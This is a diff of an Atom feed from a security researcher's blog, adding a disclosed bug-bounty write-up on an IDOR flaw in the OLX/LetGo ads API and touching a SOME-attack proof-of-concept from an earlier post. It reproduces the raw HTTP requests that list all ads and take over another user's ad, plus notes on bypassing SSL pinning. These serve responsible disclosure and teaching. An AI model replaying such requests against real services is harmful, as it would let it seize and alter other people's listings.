@@ -1,5 +1,88 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.1">Jekyll</generator><link href="https://kciredor.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://kciredor.com/" rel="alternate" type="text/html" /><updated>2017-09-19T15:26:19+02:00</updated><id>https://kciredor.com/</id><title type="html">kciredor’s information security blog</title><subtitle>Security researcher. Software engineer. Independent. This blog features my write-up's on interesting research and security findings. Make sure you follow me on Twitter @kciredor_ to stay up to date on new posts!
-</subtitle><author><name>Roderick Schaefer</name></author><entry><title type="html">First bounty, time to step up my game</title><link href="https://kciredor.com/first-bounty-time-to-step-up-my-game.html" rel="alternate" type="text/html" title="First bounty, time to step up my game" /><published>2017-09-19T15:20:00+02:00</published><updated>2017-09-19T15:20:00+02:00</updated><id>https://kciredor.com/first-bounty-time-to-step-up-my-game</id><content type="html" xml:base="https://kciredor.com/first-bounty-time-to-step-up-my-game.html">&lt;h1 id=&quot;what-happened&quot;&gt;What happened&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.0">Jekyll</generator><link href="https://kciredor.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://kciredor.com/" rel="alternate" type="text/html" /><updated>2017-10-18T15:32:35+02:00</updated><id>https://kciredor.com/</id><title type="html">kciredor’s information security blog</title><subtitle>Security researcher. Software engineer. Independent. This blog features my write-up's on interesting research and security findings. Make sure you follow me on Twitter @kciredor_ to stay up to date on new posts!
+</subtitle><author><name>Roderick Schaefer</name></author><entry><title type="html">Taking over every Ad on OLX (automated), an IDOR story</title><link href="https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html" rel="alternate" type="text/html" title="Taking over every Ad on OLX (automated), an IDOR story" /><published>2017-10-18T15:30:00+02:00</published><updated>2017-10-18T15:30:00+02:00</updated><id>https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story</id><content type="html" xml:base="https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html">&lt;h1 id=&quot;public-disclosure&quot;&gt;Public disclosure&lt;/h1&gt;
+&lt;p&gt;Hi again! Thank you for reading my third blog post. Happy to share all the details with you on the Insecure Direct Object Reference attack (IDOR) as mentioned in my first blog. It has been resolved by OLX and publicly disclosed on HackerOne, meaning it’s time for a write-up!&lt;/p&gt;
+
+&lt;h1 id=&quot;some-context&quot;&gt;Some context&lt;/h1&gt;
+&lt;p&gt;OLX powers the LetGo website for a couple of countries including The Netherlands. LetGo is an eBay like website, allowing you to buy new stuff and let go of old stuff.&lt;/p&gt;
+
+&lt;p&gt;You can probably imagine the excitement I felt finding out I could take over an ad uploaded by someone else and change the pricing and details. The changes will have to go through a manual approval process, but from my repeated experience this ends up fine. Especially for example changing prices from 40 to 35 euros will always go through. Also it appears that after several approvals my account got whitelisted and approvals were not required anymore.&lt;/p&gt;
+
+&lt;p&gt;Because there was no rate limiting in place and the API supported walking through the full listing of all the ads, there was a potential for building a small script that does exactly that. Loop all the ads, take over each ad, change the pricing. This way it was possible to take over the entire collection of ads on the website.&lt;/p&gt;
+
+&lt;p&gt;Of course it’s not a good idea to actually do so, no need to prove anything this severe and cause damage. So right after verifying the initial IDOR and the moment I saw the potential I reported the issue. Also note that I did not take over any ads that were not mine: always use multiple test accounts! Safety first.&lt;/p&gt;
+
+&lt;h1 id=&quot;how-i-found-the-idor&quot;&gt;How I found the IDOR&lt;/h1&gt;
+&lt;p&gt;Having OLX permission: full disclosure time!&lt;/p&gt;
+
+&lt;p&gt;First of all we need to proxy the traffic coming from the iOS / Android apps. This traffic is SSL encrypted which is fine: just import the CA BurpSuite provisions for you. But nowadays some apps implement SSL pinning, meaning the BurpSuite CA does not work out of the box. You can bypass this added layer of protection by unpinning SSL. One way would be reverse engineering the app and patching out the checks, but a much easier way is to unpin system wide.&lt;/p&gt;
+
+&lt;p&gt;So I have set up both a jailbroken iPad with SSL pinning disabled (using a cydia app) and an Android phone with SSL pinning disabled (using an Xposed module). This way you can always intercept traffic using a proxy like BurpSuite and (almost) any app. Note that you can just as easily set up Android emulators to accomplish the same goal (try genymotion or android studio).&lt;/p&gt;
+
+&lt;p&gt;By intercepting the API calls during browsing of your iOS and Android apps, you can learn about-, change- and repeat API calls.&lt;/p&gt;
+
+&lt;p&gt;Setup test accounts:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Android account: token ‘111111’&lt;/li&gt;
+  &lt;li&gt;iOS     account: token ‘222222’&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;ACCOUNT_1:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Post a new ad using token ‘111111’ (returns the ID, in this test case: 888888).&lt;/li&gt;
+  &lt;li&gt;Wait for approval&lt;/li&gt;
+  &lt;li&gt;Approved and published on site&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;ACCOUNT_2:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Fetch advertisement list through a search api call&lt;/li&gt;
+  &lt;li&gt;Attack an ad by doing a POST call (picked the newly posted 888888 here).&lt;/li&gt;
+  &lt;li&gt;The takeover of the ad is instant: it’s now in ACCOUNT_2, not in ACCOUNT_1 anymore&lt;/li&gt;
+  &lt;li&gt;Wait for approval&lt;/li&gt;
+  &lt;li&gt;Approved and published on site with my changes&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The attack - using ACCOUNT_2 - involves two api calls: GET /i2/ajax/ads/ (to get id’s) and POST /i2/newadding/ (to take over and make changes).&lt;/p&gt;
+
+&lt;p&gt;The GET call lists all the ads including id’s (paginated) and looks like this:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;GET /i2/ajax/ads/?json=1&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;app\_ios=285&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;brand=Letgo&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;client=ios&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;version=285&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;token=222222&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;location=1,1&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;lang=en&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;search%5Blat%5D=1&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;search%5Blon%5D=1&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;search%5Border%5D=dist&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;search%5Bdistance%5D=20000 HTTP/1.1
+Host: letgonl-a.akamaihd.net
+Connection: close
+Accept: */*
+User-Agent: Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1           Accept-Language: en-NL;q=1.0, nl-NL;q=0.9
+X-Origin-OLX: production&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The POST call - the actual attack / IDOR - looks like this:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;POST /i2/newadding/?json=1&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;app_ios=285&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;brand=Letgo&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;client=ios&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;version=285&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;token=222222&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;location=1,1&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;lang=en HTTP/1.1
+Host: letgonl-a.akamaihd.net
+Content-Type: application/json
+Content-Length: 222
+Accept: */*
+Connection: close
+User-Agent: Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+Accept-Language: en-NL;q=1.0, nl-NL;q=0.9
+X-Origin-OLX: production
+
+{&quot;ad_id&quot;:888888,&quot;params&quot;:{&quot;price&quot;:&quot;35&quot;},&quot;description&quot;:&quot;This is awesome&quot;,&quot;person&quot;:&quot;nickname&quot;,&quot;title&quot;:&quot;My title&quot;,&quot;category_id&quot;:&quot;800&quot;,&quot;locations&quot;:[{&quot;map_lon&quot;:1,&quot;map_lat&quot;:2}]}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Note that I’m just repeating the GET and POST calls I intercepted, replacing the token from ACCOUNT_1 with the token from ACCOUNT_2.&lt;/p&gt;
+
+&lt;p&gt;Again I would like to emphasize you must always use test accounts, never cause damage, think before you act. It’s a lot of fun, but it’s not a game!&lt;/p&gt;
+
+&lt;p&gt;My suggested fix was: ‘The update POST call does check for something like “is_authenticated()” but it appears it does not check for “is_authorized()”, which in turn could implement something like “is_owner()”.’&lt;/p&gt;
+
+&lt;h1 id=&quot;lessons-learned&quot;&gt;Lessons learned&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;Focus on bug bounty programs with a good track record. Chasing should not be nescessary, it’s a two way street. And #NoFreeBugs.&lt;/li&gt;
+  &lt;li&gt;Know when to stop attacking one specific issue or platform. Got stuck? Keep on moving! Write down your notes on what you have found so far and come back later.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Let’s keep on hacking!&lt;/p&gt;
+
+&lt;p&gt;Cheers,
+kciredor&lt;/p&gt;</content><author><name>Roderick Schaefer</name></author><summary type="html">Public disclosure Hi again! Thank you for reading my third blog post. Happy to share all the details with you on the Insecure Direct Object Reference attack (IDOR) as mentioned in my first blog. It has been resolved by OLX and publicly disclosed on HackerOne, meaning it’s time for a write-up!</summary></entry><entry><title type="html">First bounty, time to step up my game</title><link href="https://kciredor.com/first-bounty-time-to-step-up-my-game.html" rel="alternate" type="text/html" title="First bounty, time to step up my game" /><published>2017-09-19T15:20:00+02:00</published><updated>2017-09-19T15:20:00+02:00</updated><id>https://kciredor.com/first-bounty-time-to-step-up-my-game</id><content type="html" xml:base="https://kciredor.com/first-bounty-time-to-step-up-my-game.html">&lt;h1 id=&quot;what-happened&quot;&gt;What happened&lt;/h1&gt;
 &lt;p&gt;Hello again and thanks for reading my second blog post! After publishing my &lt;a href=&quot;/my-first-month-as-a-full-time-bug-bounty-hunter.html&quot;&gt;first blog&lt;/a&gt; I kept on trying to hack different companies and websites. Not as easy as I had hoped for! It took me quite some time to find another security issue after the IDOR in my &lt;a href=&quot;/my-first-month-as-a-full-time-bug-bounty-hunter.html&quot;&gt;first month&lt;/a&gt;. This SOME issue I found is not to be made public, so I won’t be able to mention company details and will have to mask url’s etc.&lt;/p&gt;
 
 &lt;h1 id=&quot;some-attack&quot;&gt;SOME attack&lt;/h1&gt;
@@ -24,7 +107,7 @@
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fire()&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Click&lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fire&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'javascript:setTimeout(&quot;location=\'https://company.com/lib/upload.swf?target=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling...etc...firstElementChild.click&amp;amp;uid=poc_kciredor&amp;amp;\'&quot;, 2000)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'javascript:setTimeout(&quot;location=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://company.com/lib/upload.swf?target=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.nextElementSibling...etc...firstElementChild.click&amp;amp;uid=poc_kciredor&amp;amp;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&quot;, 2000)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   &lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'location=&quot;https://company.com/profile/&quot;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
